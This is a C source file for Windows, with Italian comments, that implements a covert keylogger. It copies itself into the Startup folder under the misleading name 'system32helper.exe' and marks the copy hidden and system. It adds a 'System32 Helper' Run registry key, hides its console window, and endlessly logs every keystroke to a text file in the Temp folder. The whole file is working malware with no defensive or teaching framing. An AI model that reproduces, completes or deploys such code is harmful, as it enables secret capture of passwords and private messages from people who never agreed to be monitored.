#include <stdio.h>
#include <windows.h>
#include <string.h>

void InstallToStartup() {
    char currentPath[MAX_PATH];
    char destinationPath[MAX_PATH];
    char userProfile[MAX_PATH];
    HKEY hKey;

    // Ottieni il percorso del file eseguibile corrente
    GetModuleFileName(NULL, currentPath, MAX_PATH);

    // Ottieni il percorso della cartella AppData
    GetEnvironmentVariable("USERPROFILE", userProfile, MAX_PATH);
    sprintf(destinationPath, "%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\system32helper.exe", userProfile);

    // Copia il file nella cartella di avvio solo se non esiste già
    if (GetFileAttributes(destinationPath) == INVALID_FILE_ATTRIBUTES) {
        CopyFile(currentPath, destinationPath, FALSE);
        
        // Imposta gli attributi come file nascosto e di sistema
        SetFileAttributes(destinationPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }

    // Aggiungi una voce al registro per l'avvio automatico
    RegOpenKeyEx(HKEY_CURRENT_USER, 
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                0, 
                KEY_SET_VALUE, 
                &hKey);
                
    RegSetValueEx(hKey, 
                "System32 Helper", 
                0, 
                REG_SZ, 
                (BYTE*)destinationPath, 
                strlen(destinationPath)+1);
                
    RegCloseKey(hKey);
}

void StealthMode() {
    // Nasconde la finestra della console
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
}

void LogKey(int key, FILE* file) {
    switch (key) {
        case VK_RETURN:    fprintf(file, "[ENTER]\n"); break;
        case VK_SPACE:     fprintf(file, " "); break;
        case VK_BACK:      fprintf(file, "[BACKSPACE]\n"); break;
        case VK_TAB:       fprintf(file, "[TAB]\n"); break;
        case VK_SHIFT:
        case VK_LSHIFT:    fprintf(file, "[SHIFT]\n"); break;
        case VK_RSHIFT:    fprintf(file, "[RSHIFT]\n"); break;
        case VK_CONTROL:
        case VK_LCONTROL:  fprintf(file, "[CTRL]\n"); break;
        case VK_RCONTROL:  fprintf(file, "[RCTRL]\n"); break;
        case VK_MENU:      fprintf(file, "[ALT]\n"); break;
        case VK_ESCAPE:    fprintf(file, "[ESC]\n"); break;
        case VK_CAPITAL:   fprintf(file, "[CAPSLOCK]\n"); break;
        case VK_NUMLOCK:   fprintf(file, "[NUMLOCK]\n"); break;
        case VK_SNAPSHOT:  fprintf(file, "[PRINTSCREEN]\n"); break;
        case VK_SCROLL:    fprintf(file, "[SCROLLLOCK]\n"); break;
        case VK_INSERT:    fprintf(file, "[INSERT]\n"); break;
        case VK_DELETE:    fprintf(file, "[DELETE]\n"); break;
        case VK_HOME:      fprintf(file, "[HOME]\n"); break;
        case VK_END:       fprintf(file, "[END]\n"); break;
        case VK_PRIOR:     fprintf(file, "[PAGEUP]\n"); break;
        case VK_NEXT:      fprintf(file, "[PAGEDOWN]\n"); break;
        
        case VK_LEFT:     fprintf(file, "[LEFT]\n"); break;
        case VK_RIGHT:    fprintf(file, "[RIGHT]\n"); break;
        case VK_UP:       fprintf(file, "[UP]\n"); break;
        case VK_DOWN:     fprintf(file, "[DOWN]\n"); break;
        
        case VK_F1 ... VK_F12:
            fprintf(file, "[F%d]\n", key - VK_F1 + 1);
            break;
            
        default:
            // Controlla se è un carattere stampabile
            if ((key >= 32 && key <= 126)) {
                fprintf(file, "%c", (char)key);
            }
            break;
    }
}

int main() {
    // Installa il programma all'avvio
    InstallToStartup();
    
    // Nascondi la finestra
    StealthMode();

    FILE *file;
    short keyState;
    char logPath[MAX_PATH];
    char userProfile[MAX_PATH];

    // Ottieni il percorso della cartella AppData
    GetEnvironmentVariable("USERPROFILE", userProfile, MAX_PATH);
    sprintf(logPath, "%s\\AppData\\Local\\Temp\\system_log.txt", userProfile);

    // Loop infinito
    while (1) {
        // Controlla tutti i tasti da 8 a 255
        for (int key = 8; key <= 255; key++) {
            keyState = GetAsyncKeyState(key);

            // Se il tasto è stato premuto
            if (keyState & 0x8000) {
                file = fopen(logPath, "a");
                if (file != NULL) {
                    LogKey(key, file);
                    fclose(file);
                }

                // Attendi per evitare scritture duplicate
                Sleep(50);
            }
        }
        Sleep(10); // Riduce uso CPU
    }

    return 0;
}